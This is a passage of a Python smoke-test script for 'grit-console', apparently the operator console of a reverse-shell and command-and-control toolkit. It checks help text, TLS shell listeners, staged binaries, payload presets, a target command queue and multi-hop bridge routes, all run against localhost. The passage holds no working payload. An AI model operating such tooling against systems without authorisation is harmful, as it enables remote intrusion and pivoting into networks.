            "GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC=60" not in configured_show.stdout):
        print("configured staged binary trailer is missing expected overrides", file=sys.stderr)
        print(configured_show.stdout, file=sys.stderr)
        print(configured_show.stderr, file=sys.stderr)
        return 1

    return 0

def parse_args(argv):
    parser = argparse.ArgumentParser(description="Run grit-console smoke checks.")
    parser.add_argument(
        "--section",
        choices=SECTIONS,
        default="full",
        help="run one smoke-test section instead of the full suite",
    )
    parser.add_argument(
        "--list-sections",
        action="store_true",
        help="list available --section values and exit",
    )
    return parser.parse_args(argv)


def main(argv=None):
    args = parse_args(sys.argv[1:] if argv is None else argv)
    if args.list_sections:
        for section in SECTIONS:
            print(f"{section}\t{SECTION_DESCRIPTIONS[section]}")
        return 0

    server = ROOT / "scripts" / "grit-console"

    if args.section == "line-console":
        return run_line_console_section(server)
    if args.section == "probe-delivery":
        return run_probe_delivery_section(server)

    help_out = run("scripts/grit-console", "--help")
    if help_out.returncode != 0:
        print(help_out.stderr, file=sys.stderr)
        return 1
    concise_help = help_out.stdout + help_out.stderr
    if ("griTTYkit operator control plane." not in concise_help or
            "--help-console prints interactive console commands and examples." not in concise_help or
            "--help-all prints every compatibility/API flag." not in concise_help or
            "--run-target-workflow-action" in concise_help):
        print("grit-console concise help did not stay operator-focused", file=sys.stderr)
        print(concise_help, file=sys.stderr)
        return 1
    help_console_out = run("scripts/grit-console", "--help-console")
    if help_console_out.returncode != 0:
        print(help_console_out.stderr, file=sys.stderr)
        return 1
    console_help = help_console_out.stdout + help_console_out.stderr
    if ("griTTYkit operator console reference." not in console_help or
            "use agent ID|LABEL|NUMBER" not in console_help or
            "agent ID|LABEL|NUMBER" not in console_help or
            "use job ID|NUMBER" not in console_help or
            "jobs, jobs -i ID, job ID" not in console_help or
            "interact agent ID|LABEL" not in console_help or
            "commands, copy N" not in console_help or
            "serve-binary [--start] [PATH] [NAME]" not in console_help or
            "configure NAME|PATH KEY=VALUE" not in console_help or
            "configure NAME --operator-host HOST --transport builtin" not in console_help or
            "release, release stage SELECTOR" not in console_help or
            "by_device_payload_preset:NAME:PRESET" not in console_help or
            "by_tuple_payload_preset:PATH:PRESET" not in console_help or
            "fetch [--queue] [--start] NAME" not in console_help or
            "queue list|result|clear" not in console_help or
            "build, build set KEY VALUE" not in console_help or
            "resource FILE" not in console_help or
            "makerc FILE" not in console_help or
            "!!, !N, repeat N" not in console_help or
            "--run-target-workflow-action" in console_help):
        print("grit-console console help did not stay console-focused", file=sys.stderr)
        print(console_help, file=sys.stderr)
        return 1
    help_all_out = run("scripts/grit-console", "--help-all")
    if help_all_out.returncode != 0:
        print(help_all_out.stderr, file=sys.stderr)
        return 1
    forbidden = ("--artifact", "--send", "--token", "send_file", "stager")
    combined = help_all_out.stdout + help_all_out.stderr
    if "--no-console" not in combined or "--no-tui" in combined:
        print("grit-console help did not expose --no-console while removing legacy --no-tui", file=sys.stderr)
        print(combined, file=sys.stderr)
        return 1
    for word in forbidden:
        if word in combined:
            print(f"old server protocol surfaced in help: {word}", file=sys.stderr)
            return 1

    # help must describe tls-shell as accepting both builtin+tls and socat+tls
    if "tls-shell" not in combined:
        print("grit-console help missing tls-shell transport description", file=sys.stderr)
        return 1
    if "file-service" not in combined or "--file-service" not in combined:
        print("grit-console help missing receive-only file service", file=sys.stderr)
        return 1
    if "bridge" not in combined or "--bridge-dest-host" not in combined or "--bridge-dest-port" not in combined:
        print("grit-console help missing explicit bridge mode", file=sys.stderr)
        return 1
    if "probe" not in combined or "--probe-port" not in combined:
        print("grit-console help missing probe mode", file=sys.stderr)
        return 1
    for word in ("--serve-file", "--serve-dir", "--stage-release-artifact", "--release-dir", "--run-release-artifact-workflow-action", "--list-staged", "--status", "--stop", "--stop-service", "--view-path", "--json-status", "--api-status", "--event-limit",
                 "--help-console", "--no-console",
                 "--queue-command", "--list-command-queue", "--clear-command-queue", "--copy-target-command", "--command-copy-file",
                 "--record-command-result", "--result-json", "--start-workbench-job", "--cancel-workbench-job",
                 "--run-service-workflow-action", "--service-workflow-dry-run", "--confirm-service-workflow-action",
                 "--run-operator-daemon-workflow-action", "--operator-daemon-workflow-dry-run", "--confirm-operator-daemon-workflow-action",
                 "--run-command-queue-workflow-action", "--command-queue-workflow-command", "--confirm-command-queue-workflow-action",
                 "--run-probe-workflow-action", "--probe-workflow-dry-run", "--confirm-probe-workflow-action",
                 "--run-bridge-profile-workflow-action", "--bridge-profile-workflow-dry-run", "--confirm-bridge-profile-workflow-action",
                 "--run-file-service-workflow-action", "--file-service-workflow-local-file", "--file-service-workflow-target-path", "--confirm-file-service-workflow-action",
                 "--run-staged-file-workflow-action", "--confirm-staged-file-workflow-action",
                 "--build-config", "--list-build-config", "--set-build-config"):
        if word not in combined:
            print(f"grit-console help missing operator workbench flag: {word}", file=sys.stderr)
            return 1
    removed_no_tui = run("scripts/grit-console", "--no-tui", "--status")
    if removed_no_tui.returncode == 0 or "unrecognized arguments: --no-tui" not in removed_no_tui.stderr:
        print("legacy --no-tui compatibility alias was not removed", file=sys.stderr)
        print(removed_no_tui.stdout, file=sys.stderr)
        print(removed_no_tui.stderr, file=sys.stderr)
        return 1

    # Paramiko key comparison must use get_name/get_base64, not object equality
    src = (ROOT / "scripts" / "grit-console").read_text()
    file_transfer_src = (ROOT / "scripts" / "gritlib" / "file_transfers.py").read_text()
    line_command_queue_src = (ROOT / "scripts" / "gritlib" / "line_command_queue.py").read_text()
    line_events_src = (ROOT / "scripts" / "gritlib" / "line_events.py").read_text()
    line_module_src = "\n".join(path.read_text() for path in sorted((ROOT / "scripts" / "gritlib").glob("line_*.py")))
    operator_io_src = (ROOT / "scripts" / "gritlib" / "operator_io.py").read_text()
    process_status_src = (ROOT / "scripts" / "gritlib" / "process_status.py").read_text()
    release_artifacts_src = (ROOT / "scripts" / "gritlib" / "release_artifacts.py").read_text()
    service_lifecycle_src = (ROOT / "scripts" / "gritlib" / "service_lifecycle.py").read_text()
    service_status_src = (ROOT / "scripts" / "gritlib" / "service_status.py").read_text()
    ssh_keys_src = (ROOT / "scripts" / "gritlib" / "ssh_keys.py").read_text()
    target_records_src = (ROOT / "scripts" / "gritlib" / "target_records.py").read_text()
    tls_io_src = (ROOT / "scripts" / "gritlib" / "tls_io.py").read_text()
    workbench_jobs_src = (ROOT / "scripts" / "gritlib" / "workbench_jobs.py").read_text()
    workflow_actions_src = (ROOT / "scripts" / "gritlib" / "workflow_actions.py").read_text()
    release_docs = (ROOT / "docs" / "release-bundles.md").read_text()
    for word in ("invalid_command_queue_policy",
                 "command_queue_policy_valid",
                 "command_queue_policy_error_count"):
        if word not in release_docs:
            print(f"release bundle status docs missing command queue policy contract: {word}", file=sys.stderr)
            return 1
    if "get_name()" not in src + ssh_keys_src or "get_base64()" not in src + ssh_keys_src:
        print("grit-console: Paramiko key comparison missing get_name()/get_base64()", file=sys.stderr)
        return 1
    # Should not use bare == or 'is' for key objects
    # (keys_equal helper function should exist)
    if "keys_equal" not in src + ssh_keys_src:
        print("grit-console: keys_equal helper not found", file=sys.stderr)
        return 1

    # New config field names: GRIT_RSHELL_SOCAT_PORT (not socat_listen_port or shell_listen_port)
    if "GRIT_RSHELL_SOCAT_PORT" not in src:
        print("grit-console: shell_listen_port not found (expected rename from socat_listen_port)", file=sys.stderr)
        return 1
    if "sys.stdin.isatty()" not in src or "--no-stdin" not in src or "--log-only" not in src:
        print("grit-console: stdin EOF/log-only handling not found", file=sys.stderr)
        return 1
    for word in ("open_path_in_pager", "view_path_headless_command", "workbench_path_viewed", "pager_command", "view_line_path", "view PATH", "copy_generated_command", "clipboard_command",
                 "print_line_events_view", "line_event_summary", "Raw JSONL: view", "record_workbench_refresh",
                 "workbench_refreshed", '"action": "refresh"', "operator_state_unhealthy",
                 "operator_state_unhealthy_count", "target_legacy_single_target_activity_present",
                 "target_id:", "target_label:", "target_filter_summary_text",
                 "observed_seen=", "Events  (", "target_filter_evidence_lines",
                 "Status: ", "mailbox clear", "line_banner_hint(snap)",
                 "Console help topics:",
                 "refreshed workbench at",
                 "Operator console workflow summary:", "operator_console_workflows_by_group",
                 "operator_console_workflows", "operator_console_workflow_count",
                 "release_artifact_workflow_actions", "release_artifact_workflow_actions_by_selector_kind",
                 "release_artifact_workflow_action_selected", "release_artifact_workflow_action_completed",
                 "capability=", "compatibility=", "event_tail_availability_text",
                 "Targets:", "select_line_target", "set_workbench_target_filter",
                 "Files", "target_file_transfer_records", "target_file_transfer_record_summary", "view_line_path",
                 "target_activity_records", "target_activity_records_by_target_id", "show activity",
                 "target_activity_record_summary", "target_activity_record_indexes",
                 "Target workflow actions:", "run_line_selected_action", "select_line_action",
                 "operator_action_state", "operator_action_reason", "can_run_from_curses_enter",
                 "service_workflow_actions", "service_workflow_actions_by_service", "line_action_records_from_snapshot",
                 "run_line_selected_action",
                 "Operator daemon workflow action summary:", "operator_daemon_workflow_actions_by_workflow",
                 "operator_daemon_workflow_actions",
                 "operator_daemon_workflow_action_selected", "operator_daemon_workflow_action_completed",
                 "Probe workflow action summary:", "probe_workflow_actions_by_route_kind",
                 "probe_workflow_actions:",
                 "probe_workflow_action_selected", "probe_workflow_action_completed",
                 "Command queue workflow action summary:", "command_queue_workflow_actions_by_action_id",
                 "queue COMMAND  |  queue list",
                 "command_queue_workflow_action_selected", "command_queue_workflow_action_completed",
                 "File service workflow action summary:", "file_service_workflow_actions_by_action_id",
                 "file_service_workflow_action_selected", "file_service_workflow_action_completed",
                 "File service workflow actions:",
                 "staged_file_workflow_actions", "staged_file_workflow_actions_by_request_name",
                 "staged_file_workflow_action_selected", "staged_file_workflow_action_completed",
                 "show-fetch-command", "list-staged-files",
                 "Bridge Routes", "bridge_profile_workflow_actions:", "bridge_profile_workflow_actions_by_bridge_profile",
                 "bridge_profile_workflow_action_selected", "bridge_profile_workflow_action_completed",
                 "start_line_route", "--bridge-profile",
                 "Mailbox", "pending_reason", "print_line_command_queue_view",
                 "Build Config", "workbench_config_field_records", "set_workbench_build_config",
                 "Jobs", "cancel_line_job", "start_line_job",
                 "line_action_records", "start_workbench_job_record", "run_workbench_action_record",
                 "Operator Daemon", "run_line_daemon_action", "operator_daemon_workflow_actions"):
        if word not in src + line_command_queue_src + line_events_src + line_module_src + operator_io_src + target_records_src + workbench_jobs_src + workflow_actions_src:
            print(f"grit-console: workbench pager inspection missing: {word}", file=sys.stderr)
            return 1
    for word in ("stage_release_nav_item", "stage_release_selection", "stage_line_release", "by_device:", "by_tuple_path:", "stage-release"):
        if word not in src + release_artifacts_src:
            print(f"grit-console: release device/tuple staging missing: {word}", file=sys.stderr)
            return 1
    for word in ("tty.setraw", "tcsetattr", "SSLWantReadError", "SSLWantWriteError",
                 "bytearray", "--one-shot", "listener remains open", 'reason = "active"',
                 "TLSVersion.TLSv1_2"):
        if word not in src + operator_io_src + tls_io_src:
            print(f"grit-console: robust interactive relay feature missing: {word}", file=sys.stderr)
            return 1
    for reason in ("stdin_eof", "remote_eof", "socket_error", "tls_error", "keyboard_interrupt", "timeout"):
        if reason not in src:
            print(f"grit-console: relay exit reason missing: {reason}", file=sys.stderr)
            return 1
    for word in (
        "Receive-only file service",
        "local/sessions",
        "metadata_path",
        "x-grit-source-path",
        "serves operator-staged files only when the target explicitly requests them",
        "GRIT_OPERATOR_FILE_SERVICE_PORT",
    ):
        if word not in src + file_transfer_src:
            print(f"grit-console: file service feature missing: {word}", file=sys.stderr)
            return 1
    for word in ("reverse_forward_active", "requested_port", "forward_host",
                 "reverse_forward_listener", "reverse-forward listener bind failed"):
        if word not in src:
            print(f"grit-console: reverse forward event missing: {word}", file=sys.stderr)
            return 1
    if 'name="grit-reverse-forward"' not in src or "join(timeout=2.0)" not in src:
        print("grit-console: reverse-forward listener thread is not explicitly owned/joined", file=sys.stderr)
        return 1
    if ("grit-reverse-forward-pipe-" not in src or
            "register_socket(local)" not in src or
            "register_transport(chan)" not in src or
            "register_thread(threading.Thread(" not in src or
            "daemon=True" in src):
        print("grit-console: reverse-forward relay resources are not explicitly owned", file=sys.stderr)
        return 1
    for word in ("ServiceManager", "SERVICE_MANAGER = ServiceManager(", "register_transport",
                 "SERVICE_MANAGER.register_socket", "SERVICE_MANAGER.shutdown()", "register_thread",
                 "start_child_process", "from gritlib.runtime import", "EventLog", "Service",
                 "Session", "SessionManager", "SESSION_MANAGER = SessionManager()",
                 "SESSION_MANAGER.start_record", "SESSION_MANAGER.finish_record"):
        if word not in src:
            print(f"grit-console: service/session manager primitive missing: {word}", file=sys.stderr)
            return 1
    if "OWNED_TRANSPORTS.append(transport)" in src:
        print("grit-console: transport ownership bypasses ServiceManager", file=sys.stderr)
        return 1
    if "proc = subprocess.Popen(cmd" in src:
        print("grit-console: workbench child process bypasses ServiceManager", file=sys.stderr)
        return 1
    stop_helper = service_lifecycle_src[service_lifecycle_src.find("def stop_recorded_service"):]
    if ("managed_server_evidence(pid, cfg=cfg, rec=rec)" not in stop_helper or
            "service_stop_skipped" not in stop_helper or
            "unmanaged-pid" not in stop_helper or
            "workbench-stop" not in stop_helper):
        print("grit-console: workbench stop path lacks managed-PID safety guard", file=sys.stderr)
        return 1
    if ("cmdline_option_matches_path" not in process_status_src or
            "ownership_evidence" not in src + service_status_src or
            "unmanaged_recorded_pid" not in src + service_status_src):
        print("grit-console: PID ownership evidence reporting missing", file=sys.stderr)
        return 1
    if run_local_ips_cache_check(server) != 0:
        return 1
    if run_line_local_ips_check() != 0:
        return 1
    if run_line_repl_runtime_check() != 0:
        return 1

    if args.section == "preflight":
        print("grit-console smoke preflight ok")
        return 0

    with tempfile.TemporaryDirectory() as tmp:
        cert_path = Path(tmp) / "shell-server.crt"
        key_path = Path(tmp) / "shell-server.key"
        port1 = free_port()
        port2 = free_port()

        # Test: missing cert/key → server auto-generates them, then runs.
        # Use a high ephemeral port with a short timeout so the server exits
        # cleanly after confirming it started (rather than binding to port 1).
        cfg = Path(tmp) / "server-config.json"
        queue_operator_dir = Path(tmp) / "operator-session-queue"
        cfg.write_text(json.dumps({
            "GRIT_RSHELL_TRANSPORT": "tls-shell",
            "listen_host": "127.0.0.1",
            "GRIT_RSHELL_SOCAT_PORT": port1,
            "session_root": str(Path(tmp) / "sessions"),
            "operator_session_dir": str(queue_operator_dir),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
        }), encoding="utf-8")
        result = run("scripts/grit-console", "--config", str(cfg),
                     "--transport", "tls-shell", "--timeout", "0.05")
        combined = result.stdout + result.stderr
        # The server should have auto-generated the cert and started
        if not cert_path.is_file() or not key_path.is_file():
            print("TLS cert/key were not auto-generated:", file=sys.stderr)
            print(combined, file=sys.stderr)
            return 1
        # Log should mention the generation
        if "Generating" not in combined and "Generated" not in combined and "generating" not in combined:
            print("Server did not report TLS cert generation:", file=sys.stderr)
            print(combined, file=sys.stderr)
            return 1

        echo_result, echo_done, echo_thread = start_one_shot_echo_server()
        bridge_port = free_port()
        bridge_cfg = Path(tmp) / "bridge-config.json"
        bridge_state = Path(tmp) / "bridge-state.json"
        bridge_operator_dir = Path(tmp) / "operator-session-bridge"
        bridge_profiles = bridge_operator_dir / "bridge-profiles.json"
        bridge_cfg.write_text(json.dumps({
            "GRIT_RSHELL_TRANSPORT": "bridge",
            "listen_host": "127.0.0.1",
            "bridge_listen_port": bridge_port,
            "bridge_dest_host": "127.0.0.1",
            "bridge_dest_port": echo_result["port"],
            "operator_session_dir": str(bridge_operator_dir),
            "server_state": str(bridge_state),
            "session_root": str(Path(tmp) / "bridge-sessions"),
            "bridge_profiles_file": str(bridge_profiles),
        }), encoding="utf-8")
        save_bridge_profile = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--target-id", "target-bridge",
            "--target-label", "Bridge Target",
            "--save-bridge-profile", "lab-http",
            "--bridge-profile-purpose", "web-admin",
            "--bridge-profile-notes", "one hop smoke",
        )
        if (save_bridge_profile.returncode != 0 or
                "saved bridge profile lab-http" not in save_bridge_profile.stdout or
                "operator:" not in save_bridge_profile.stdout or
                not bridge_profiles.is_file()):
            print("bridge profile save failed", file=sys.stderr)
            print(save_bridge_profile.stdout, file=sys.stderr)
            print(save_bridge_profile.stderr, file=sys.stderr)
            return 1
        save_bridge_chain = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--target-id", "target-bridge",
            "--target-label", "Bridge Target",
            "--save-bridge-profile", "chain-http",
            "--bridge-profile-purpose", "multi-hop-web",
            "--bridge-profile-notes", "two hop smoke",
            "--bridge-hop", f"operator:{bridge_port}=rack-host:9001",
            "--bridge-hop", "rack-host:9001=target-lan-device:80",
        )
        expected_chain_path = f"operator:{bridge_port} -> rack-host:9001 -> target-lan-device:80"
        if (save_bridge_chain.returncode != 0 or
                "saved bridge profile chain-http" not in save_bridge_chain.stdout or
                expected_chain_path not in save_bridge_chain.stdout):
            print("multi-hop bridge profile save failed", file=sys.stderr)
            print(save_bridge_chain.stdout, file=sys.stderr)
            print(save_bridge_chain.stderr, file=sys.stderr)
            return 1
        save_delete_bridge = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--save-bridge-profile", "delete-me",
            "--bridge-profile-purpose", "temporary",
        )
        if save_delete_bridge.returncode != 0 or "saved bridge profile delete-me" not in save_delete_bridge.stdout:
            print("temporary bridge profile save failed", file=sys.stderr)
            print(save_delete_bridge.stdout, file=sys.stderr)
            print(save_delete_bridge.stderr, file=sys.stderr)
            return 1
        inspect_bridge_profile = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--inspect-bridge-profile", "chain-http",
        )
        if ("Bridge profile chain-http" not in inspect_bridge_profile.stdout or
                expected_chain_path not in inspect_bridge_profile.stdout or
                "start_command:" not in inspect_bridge_profile.stdout or
                "hop 2: rack-host:9001 -> target-lan-device:80" not in inspect_bridge_profile.stdout):
            print("bridge profile inspect missing route details", file=sys.stderr)
            print(inspect_bridge_profile.stdout, file=sys.stderr)
            print(inspect_bridge_profile.stderr, file=sys.stderr)
            return 1
        inspect_bridge_json = json.loads(run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--inspect-bridge-profile", "chain-http",
            "--json-bridge-profiles",
        ).stdout)
        if ((inspect_bridge_json.get("profile") or {}).get("name") != "chain-http" or
                (inspect_bridge_json.get("profile") or {}).get("route_path") != expected_chain_path):
            print("bridge profile JSON inspect missing profile", file=sys.stderr)
            print(json.dumps(inspect_bridge_json, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        delete_bridge_profile = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--delete-bridge-profile", "delete-me",
        )
        if delete_bridge_profile.returncode != 0 or "deleted bridge profile delete-me" not in delete_bridge_profile.stdout:
            print("bridge profile delete failed", file=sys.stderr)
            print(delete_bridge_profile.stdout, file=sys.stderr)
            print(delete_bridge_profile.stderr, file=sys.stderr)
            return 1
        tui_bridge_port = free_port()
        bridge_tui_master, bridge_tui_slave = pty.openpty()
        try:
            bridge_tui_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(bridge_cfg),
                ],
                cwd=ROOT,
                stdin=bridge_tui_slave,
                stdout=bridge_tui_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(bridge_tui_slave)
            bridge_tui_slave = -1
            time.sleep(0.5)
            bridge_tui_input = (
                f"17\nchain-http\ninspect\n"
                f"17\nchain-http\nstop\n"
                f"17\nnew\ntui-http\n{tui_bridge_port}\n127.0.0.1\n{echo_result['port']}\n"
                "tui-created\nline tui profile\n\n"
                "17\ntui-http\ndelete\nq\n"
            ).encode("utf-8")
            os.write(bridge_tui_master, bridge_tui_input)
            _bridge_tui_stdout, bridge_tui_stderr = bridge_tui_proc.communicate(timeout=8)
            bridge_tui_output = b""
            while True:
                try:
                    chunk = os.read(bridge_tui_master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                bridge_tui_output += chunk
        finally:
            if bridge_tui_slave != -1:
                os.close(bridge_tui_slave)
            try:
                os.close(bridge_tui_master)
            except OSError:
                pass
        bridge_tui_text = bridge_tui_output.decode("utf-8", errors="replace")
        if (bridge_tui_proc.returncode != 0 or
                "Traceback" in (bridge_tui_stderr or "") or
                "selected bridge profile chain-http" not in bridge_tui_text or
                "bridge_profile_workflow_actions: 4" not in bridge_tui_text or
                "start-profile: state=ready" not in bridge_tui_text or
                "headless_command:" in bridge_tui_text or
                "saved bridge profile tui-http" not in bridge_tui_text or
                "deleted bridge profile tui-http" not in bridge_tui_text):
            print("line console bridge profile management exposed noisy headless command or missed expected summary", file=sys.stderr)
            print(bridge_tui_text, file=sys.stderr)
            print(bridge_tui_stderr or "", file=sys.stderr)
            return 1
        list_bridge_profiles = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--list-bridge-profiles",
        )
        if ("lab-http" not in list_bridge_profiles.stdout or
                "chain-http" not in list_bridge_profiles.stdout or
                "delete-me" in list_bridge_profiles.stdout or
                "tui-http" in list_bridge_profiles.stdout or
                expected_chain_path not in list_bridge_profiles.stdout or
                "target=target-bridge" not in list_bridge_profiles.stdout or
                "path: operator:" not in list_bridge_profiles.stdout):
            print("bridge profile list missing saved route", file=sys.stderr)
            print(list_bridge_profiles.stdout, file=sys.stderr)
            return 1
        json_bridge_profiles = json.loads(run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--json-bridge-profiles",
        ).stdout)
        chain_profile = (json_bridge_profiles.get("bridge_profiles_by_name") or {}).get("chain-http") or {}
        chain_hops = (json_bridge_profiles.get("bridge_hops_by_profile") or {}).get("chain-http") or []
        if (chain_profile.get("multi_hop") is not True or
                chain_profile.get("hop_count") != 2 or
                chain_profile.get("route_path") != expected_chain_path or
                len(chain_profile.get("hops") or []) != 2 or
                len(chain_hops) != 2 or
                chain_hops[0].get("from") != f"operator:{bridge_port}" or
                chain_hops[0].get("to") != "rack-host:9001" or
                chain_hops[1].get("from") != "rack-host:9001" or
                chain_hops[1].get("to") != "target-lan-device:80" or
                chain_hops[0].get("is_first_hop") is not True or
                chain_hops[1].get("is_last_hop") is not True or
                (json_bridge_profiles.get("bridge_hops_by_to") or {}).get("target-lan-device:80", [{}])[0].get("profile") != "chain-http" or
                ((json_bridge_profiles.get("bridge_profiles_by_multi_hop") or {}).get("True") or [{}])[0].get("name") != "chain-http" or
                ((json_bridge_profiles.get("bridge_profiles_by_hop_count") or {}).get("2") or [{}])[0].get("route_path") != expected_chain_path or
                (json_bridge_profiles.get("bridge_profiles_by_route_path") or {}).get(expected_chain_path, [{}])[0].get("name") != "chain-http"):
            print("json bridge profiles missing multi-hop metadata", file=sys.stderr)
            print(json.dumps(json_bridge_profiles, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        bridge_proc = subprocess.Popen(
            [
                "scripts/grit-console",
                "--config", str(bridge_cfg),
                "--transport", "bridge",
                "--bridge-profile", "lab-http",
                "--timeout", "10",
                "--one-shot",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        try:
            bridge_reply = request_with_retry(bridge_port, b"hello")
            if bridge_reply != b"bridge:hello":
                print(f"bridge relay returned wrong payload: {bridge_reply!r}", file=sys.stderr)
                return 1
            out, err = bridge_proc.communicate(timeout=5)
        finally:
            if bridge_proc.poll() is None:
                bridge_proc.terminate()
                bridge_proc.wait(timeout=5)
        echo_done.wait(5)
        echo_thread.join(timeout=5)
        if echo_result.get("error"):
            print(f"bridge echo server failed: {echo_result['error']}", file=sys.stderr)
            return 1
        if bridge_proc.returncode != 0 or "bridge closed" not in out:
            print("bridge listener did not relay cleanly", file=sys.stderr)
            print(out, file=sys.stderr)
            print(err, file=sys.stderr)
            return 1
        bridge_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--event-limit", "32",
            "--json-status",
        ).stdout)
        bridge_service = (bridge_status.get("services_by_name") or {}).get("bridge") or {}
        bridge_events = bridge_status.get("events_by_event", {})
        bridge_profile = (bridge_status.get("bridge_profiles_by_name") or {}).get("lab-http") or {}
        bridge_hops = bridge_status.get("bridge_hop_records") or []
        chain_status_hops = (bridge_status.get("bridge_hops_by_profile") or {}).get("chain-http") or []
        bridge_target = (bridge_status.get("targets_by_id") or {}).get("target-bridge") or {}
        bridge_workflow_actions = (bridge_status.get("target_workflow_actions_by_target_id") or {}).get("target-bridge") or []
        bridge_actions_by_action = {
            rec.get("action_id"): rec
            for rec in (bridge_status.get("target_workflow_actions_by_bridge_profile") or {}).get("lab-http", [])
        }
        bridge_action = bridge_actions_by_action.get("start-bridge:lab-http") or {}
        bridge_queue_action = bridge_actions_by_action.get("queue-bridge-start:lab-http") or {}
        bridge_profile_workflow_actions = bridge_status.get("bridge_profile_workflow_actions") or []
        bridge_profile_actions_by_profile = bridge_status.get("bridge_profile_workflow_actions_by_bridge_profile") or {}
        lab_profile_actions = {
            rec.get("action_id"): rec
            for rec in bridge_profile_actions_by_profile.get("lab-http", [])
        }
        if (bridge_service.get("port") != bridge_port or
                bridge_service.get("actual") != "stopped" or
                bridge_status.get("summary", {}).get("bridge_profile_count") != 2 or
                bridge_status.get("summary", {}).get("bridge_profile_workflow_action_count") != 8 or
                bridge_status.get("summary", {}).get("bridge_profile_workflow_action_available_count") != 8 or
                bridge_status.get("summary", {}).get("bridge_profile_workflow_action_requires_confirmation_count") != 2 or
                bridge_status.get("summary", {}).get("bridge_profile_workflow_action_can_run_from_curses_enter_count") != 2 or
                bridge_status.get("summary", {}).get("bridge_profile_workflow_action_action_counts", {}).get("inspect-profile") != 2 or
                bridge_status.get("summary", {}).get("bridge_profile_workflow_action_action_counts", {}).get("start-profile") != 2 or
                bridge_status.get("summary", {}).get("bridge_profile_workflow_action_action_counts", {}).get("stop-profile") != 2 or
                bridge_status.get("summary", {}).get("bridge_profile_workflow_action_action_counts", {}).get("delete-profile") != 2 or
                bridge_status.get("summary", {}).get("bridge_profile_workflow_action_bridge_profile_counts", {}).get("lab-http") != 4 or
                bridge_status.get("summary", {}).get("bridge_profile_workflow_action_fleet_target_count_counts", {}).get("1") != 8 or
                bridge_status.get("summary", {}).get("bridge_profile_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get("0") != 8 or
                bridge_status.get("summary", {}).get("target_workflow_action_count") != 13 or
                bridge_status.get("summary", {}).get("target_workflow_action_bridge_profile_counts", {}).get("lab-http") != 2 or
                bridge_status.get("summary", {}).get("target_workflow_action_bridge_profile_counts", {}).get("chain-http") != 2 or
                bridge_status.get("summary", {}).get("target_workflow_action_requires_target_online_count") != 2 or
                bridge_status.get("summary", {}).get("target_workflow_action_offline_supported_count") != 11 or
                bridge_status.get("summary", {}).get("target_workflow_action_queues_offline_work_count") != 6 or
                bridge_status.get("summary", {}).get("target_workflow_action_target_phone_home_required_count") != 8 or
                bridge_status.get("summary", {}).get("target_latest_bridge_activity_count") != 1 or
                bridge_status.get("summary", {}).get("target_latest_bridge_profile_counts", {}).get("lab-http") != 1 or
                bridge_status.get("summary", {}).get("target_latest_bridge_status_counts", {}).get("closed") != 1 or
                bridge_status.get("summary", {}).get("bridge_profile_has_last_successful_relay_counts", {}).get("True") != 1 or
                bridge_status.get("summary", {}).get("bridge_profile_has_last_failure_counts", {}).get("False") != 2 or
                len(bridge_workflow_actions) != 13 or
                bridge_action.get("target_id") != "target-bridge" or
                bridge_action.get("workflow") != "bridge" or
                bridge_action.get("requires_target_online") is not True or
                bridge_action.get("offline_supported") is not False or
                bridge_action.get("headless_command") != f"scripts/grit-console --config {str(bridge_cfg)} --transport bridge --bridge-profile lab-http" or
                bridge_queue_action.get("target_id") != "target-bridge" or
                bridge_queue_action.get("workflow") != "bridge" or
                bridge_queue_action.get("requires_target_online") is not False or
                bridge_queue_action.get("queues_offline_work") is not True or
                bridge_queue_action.get("target_phone_home_required") is not True or
                bridge_queue_action.get("headless_command") != f"scripts/grit-console --config {str(bridge_cfg)} --run-target-workflow-action target-bridge:queue-bridge-start:lab-http" or
                len(bridge_profile_workflow_actions) != 8 or
                len(bridge_profile_actions_by_profile.get("lab-http", [])) != 4 or
                lab_profile_actions.get("start-profile", {}).get("headless_command") != f"scripts/grit-console --config {str(bridge_cfg)} --transport bridge --bridge-profile lab-http" or
                lab_profile_actions.get("start-profile", {}).get("run_command") != f"scripts/grit-console --config {str(bridge_cfg)} --run-bridge-profile-workflow-action lab-http:start-profile" or
                lab_profile_actions.get("start-profile", {}).get("dry_run_command") != f"scripts/grit-console --config {str(bridge_cfg)} --run-bridge-profile-workflow-action lab-http:start-profile --bridge-profile-workflow-dry-run" or
                lab_profile_actions.get("start-profile", {}).get("operator_action_state") != "ready" or
                lab_profile_actions.get("start-profile", {}).get("can_run_from_curses_enter") is not True or
                lab_profile_actions.get("start-profile", {}).get("fleet_target_count") != 1 or
                lab_profile_actions.get("start-profile", {}).get("fleet_mailbox_pending_work_count") != 0 or
                lab_profile_actions.get("start-profile", {}).get("fleet_has_mailbox_pending_work") is not False or
                lab_profile_actions.get("stop-profile", {}).get("operator_action_state") != "not-running" or
                lab_profile_actions.get("stop-profile", {}).get("run_command", "").find("--confirm-bridge-profile-workflow-action") == -1 or
                lab_profile_actions.get("delete-profile", {}).get("requires_confirmation") is not True or
                lab_profile_actions.get("delete-profile", {}).get("run_command", "").find("--confirm-bridge-profile-workflow-action") == -1 or
                lab_profile_actions.get("inspect-profile", {}).get("headless_command") != f"scripts/grit-console --config {str(bridge_cfg)} --inspect-bridge-profile lab-http" or
                lab_profile_actions.get("inspect-profile", {}).get("run_command") != f"scripts/grit-console --config {str(bridge_cfg)} --run-bridge-profile-workflow-action lab-http:inspect-profile" or
                bridge_profile.get("target_id") != "target-bridge" or
                bridge_profile.get("purpose") != "web-admin" or
